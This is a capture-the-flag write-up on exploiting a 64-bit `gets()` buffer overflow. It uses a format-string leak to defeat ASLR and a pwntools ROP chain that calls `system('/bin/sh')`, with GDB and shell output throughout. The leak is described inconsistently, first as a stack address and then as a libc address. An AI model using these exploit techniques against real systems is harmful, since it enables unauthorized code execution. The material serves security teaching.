# Binary Exploitation — Buffer Overflow (ASLR Bypass + ROP Chain)

**Category:** Binary Exploitation (Pwn)

**Difficulty:** Hard

**Tools Used:** GDB, pwntools, ROPgadget

**Key Learning:** Modern exploit mitigation bypasses

---

## Challenge Description

A 64-bit Linux binary with a vulnerable `gets()` call. Protections enabled: NX (no executable stack), ASLR (address space layout randomization). PIE is disabled. Goal: achieve remote code execution and read `flag.txt`.

**Binary protections (via checksec):**
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE
ASLR:     Enabled (system-level)
```

---

## Step 1 — Find the Vulnerability

Opening the binary in GDB and disassembling `main`:

```bash
gdb ./vuln
(gdb) disas main
```

Spotted a call to `gets()` — an inherently unsafe function with no bounds checking:

```c
// Decompiled pseudocode (from Ghidra)
void vulnerable_function() {
    char buf[64];
    puts("Enter your name: ");
    gets(buf);   // ← no length check = buffer overflow
    printf("Hello, %s!\n", buf);
}
```

---

## Step 2 — Find the Offset

Used GDB with a cyclic pattern to find exactly how many bytes overwrite the return address:

```bash
# Generate a 200-byte cyclic pattern
python3 -c "from pwn import *; print(cyclic(200))"

# Run in GDB, paste pattern, observe crash
(gdb) run
Enter your name: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV
RIP: 0x6161616c61616169   ← pattern bytes in RIP

# Find offset
python3 -c "from pwn import *; print(cyclic_find(0x6161616c61616169))"
# Output: 72
```

The return address is overwritten at offset **72 bytes**.

---

## Step 3 — Bypass ASLR with Information Leak

ASLR randomizes the stack and libc base each run. With PIE disabled, the binary's own addresses are fixed — but we need a libc address to call `system()`.

Found a `printf` format string in a secondary function that leaks a stack pointer:

```python
from pwn import *

p = process("./vuln")

# Trigger the leak
p.sendline(b"%21$p")   # leak stack address via format string
leak = int(p.recvline().strip(), 16)
print(f"[+] Leaked address: {hex(leak)}")

# Calculate libc base from known offset
libc_base = leak - 0x7f3a2  # offset determined via GDB
print(f"[+] libc base: {hex(libc_base)}")
```

---

## Step 4 — Build the ROP Chain

NX prevents shellcode on the stack, so we use Return-Oriented Programming (ROP) — chaining existing code snippets ("gadgets") in the binary and libc to call `system("/bin/sh")`.

**Find gadgets with ROPgadget:**

```bash
ROPgadget --binary ./vuln | grep "pop rdi"
# 0x00000000004012b3 : pop rdi ; ret

ROPgadget --binary ./vuln | grep "ret$"
# 0x000000000040101a : ret   ← stack alignment gadget
```

**Calculate addresses:**

```python
from pwn import *

elf  = ELF("./vuln")
libc = ELF("./libc.so.6")

p = process("./vuln")

# --- Leak libc base ---
p.sendline(b"%21$p")
leak = int(p.recvline().strip(), 16)
libc.address = leak - libc.symbols['__libc_start_main'] - 0x7f

print(f"[+] libc base: {hex(libc.address)}")

system    = libc.symbols['system']
bin_sh    = next(libc.search(b'/bin/sh'))
pop_rdi   = 0x00000000004012b3   # from ROPgadget
ret       = 0x000000000040101a   # stack alignment for 64-bit

print(f"[+] system():   {hex(system)}")
print(f"[+] /bin/sh:    {hex(bin_sh)}")
```

**Build and send the payload:**

```python
offset = 72

payload  = b"A" * offset       # padding to reach return address
payload += p64(ret)             # align stack (required for 64-bit)
payload += p64(pop_rdi)         # gadget: pop rdi ; ret
payload += p64(bin_sh)          # argument: pointer to "/bin/sh"
payload += p64(system)          # call system("/bin/sh")

p.sendline(payload)
p.interactive()   # drop into shell
```

---

## Step 5 — Shell & Flag

```
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat flag.txt
CTF{r0p_ch41n_g0es_brrrr_byp4ss_th3_nx}
```

---

## Key Takeaways

- **NX alone doesn't stop exploitation** — ROP chains use existing executable code
- **ASLR requires an info leak** to defeat — always look for format strings, `printf` misuse, or `puts()`/`write()` that expose addresses
- **64-bit calling convention** requires arguments in registers (RDI, RSI, RDX) — `pop rdi ; ret` gadgets are essential
- **Stack alignment** matters in 64-bit — a misaligned stack will crash `system()` via a `movaps` instruction; add a bare `ret` gadget to fix it

---

*[← Back to Writeups Index](../README.md)*
